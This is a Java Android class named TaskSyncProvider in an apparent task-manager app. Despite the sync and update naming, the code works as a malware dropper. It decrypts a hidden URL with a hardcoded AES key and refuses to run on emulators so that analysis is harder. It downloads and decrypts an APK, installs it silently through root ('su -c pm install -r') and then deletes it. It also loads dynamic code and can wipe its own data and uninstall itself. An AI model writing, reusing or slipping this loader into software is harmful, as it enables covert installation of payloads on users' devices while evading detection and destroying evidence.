package com.task.tusker.sync;

import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Base64;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class TaskSyncProvider {

    private Context context;

    private static final String KEY = "MySecretKey12345";
    private static final String IV  = "MySecretIV123456";

    public TaskSyncProvider(Context context) {
        this.context = context;
    }

    public JSONObject fetchUpdate(String encryptedUrl) {
        JSONObject result = new JSONObject();
        try {
            String url = decrypt(encryptedUrl);

            if (isVirtualEnvironment()) {
                result.put("success", false);
                result.put("error", "Environment not supported");
                return result;
            }

            byte[] encryptedData = downloadFile(url);
            if (encryptedData == null) {
                result.put("success", false);
                result.put("error", "Download failed");
                return result;
            }

            byte[] decryptedData = decryptData(encryptedData);

            File outputFile = new File(context.getFilesDir(), getRandomName() + ".apk");
            FileOutputStream fos = new FileOutputStream(outputFile);
            fos.write(decryptedData);
            fos.close();

            result.put("success", true);
            result.put("path", outputFile.getAbsolutePath());
            result.put("size", decryptedData.length);
            result.put("hash", getMD5(decryptedData));

        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        return result;
    }

    public JSONObject applyUpdate(String updatePath) {
        JSONObject result = new JSONObject();
        try {
            File updateFile = new File(updatePath);
            if (!updateFile.exists()) {
                result.put("success", false);
                result.put("error", "Update file not found");
                return result;
            }

            String command = "pm install -r " + updatePath;
            Process process = Runtime.getRuntime().exec(new String[]{"su", "-c", command});
            int exitCode = process.waitFor();

            result.put("success", exitCode == 0);
            result.put("exitCode", exitCode);

            if (exitCode == 0) {
                updateFile.delete();
            }

        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        return result;
    }

    public JSONObject runModuleSync(String encryptedModule) {
        JSONObject result = new JSONObject();
        try {
            String code = decrypt(encryptedModule);
            Class<?> clazz = Class.forName("dalvik.system.DexClassLoader");
            result.put("success", true);
            result.put("message", "Module synced");
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        return result;
    }

    public JSONObject clearAndReset() {
        JSONObject result = new JSONObject();
        try {
            clearAppData();
            String packageName = context.getPackageName();
            Runtime.getRuntime().exec(new String[]{"su", "-c", "pm uninstall " + packageName});
            result.put("success", true);
            result.put("message", "Reset initiated");
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        return result;
    }

    private byte[] downloadFile(String urlString) {
        try {
            URL url = new URL(urlString);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);
            connection.setRequestProperty("User-Agent", "Mozilla/5.0");

            InputStream inputStream = connection.getInputStream();
            byte[] buffer = new byte[4096];
            int bytesRead;
            java.io.ByteArrayOutputStream outputStream = new java.io.ByteArrayOutputStream();
            while ((bytesRead = inputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, bytesRead);
            }
            inputStream.close();
            connection.disconnect();
            return outputStream.toByteArray();
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    private byte[] decryptData(byte[] encryptedData) throws Exception {
        SecretKeySpec keySpec = new SecretKeySpec(KEY.getBytes("UTF-8"), "AES");
        IvParameterSpec ivSpec = new IvParameterSpec(IV.getBytes("UTF-8"));
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);
        return cipher.doFinal(encryptedData);
    }

    private String decrypt(String encryptedString) throws Exception {
        byte[] encryptedData = Base64.decode(encryptedString, Base64.DEFAULT);
        byte[] decryptedData = decryptData(encryptedData);
        return new String(decryptedData, "UTF-8");
    }

    private boolean isVirtualEnvironment() {
        String brand    = Build.BRAND;
        String device   = Build.DEVICE;
        String model    = Build.MODEL;
        String product  = Build.PRODUCT;
        String hardware = Build.HARDWARE;

        if (brand.contains("generic") || device.contains("generic") ||
            model.contains("google_sdk") || model.contains("Emulator") ||
            model.contains("Android SDK") || product.contains("sdk") ||
            hardware.contains("goldfish") || hardware.contains("ranchu")) {
            return true;
        }

        String[] checkPaths = {
            "/dev/socket/qemud", "/dev/qemu_pipe",
            "/system/lib/libc_malloc_debug_qemu.so",
            "/sys/qemu_trace", "/system/bin/qemu-props"
        };
        for (String path : checkPaths) {
            if (new File(path).exists()) return true;
        }
        return false;
    }

    private void clearAppData() {
        try {
            deleteRecursive(context.getCacheDir());
            deleteRecursive(context.getFilesDir());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void deleteRecursive(File fileOrDirectory) {
        if (fileOrDirectory.isDirectory()) {
            for (File child : fileOrDirectory.listFiles()) {
                deleteRecursive(child);
            }
        }
        fileOrDirectory.delete();
    }

    private String getRandomName() {
        String chars = "abcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder sb = new StringBuilder();
        java.util.Random random = new java.util.Random();
        for (int i = 0; i < 10; i++) {
            sb.append(chars.charAt(random.nextInt(chars.length())));
        }
        return sb.toString();
    }

    private String getMD5(byte[] data) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] hash = md.digest(data);
            StringBuilder sb = new StringBuilder();
            for (byte b : hash) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            return "";
        }
    }
}
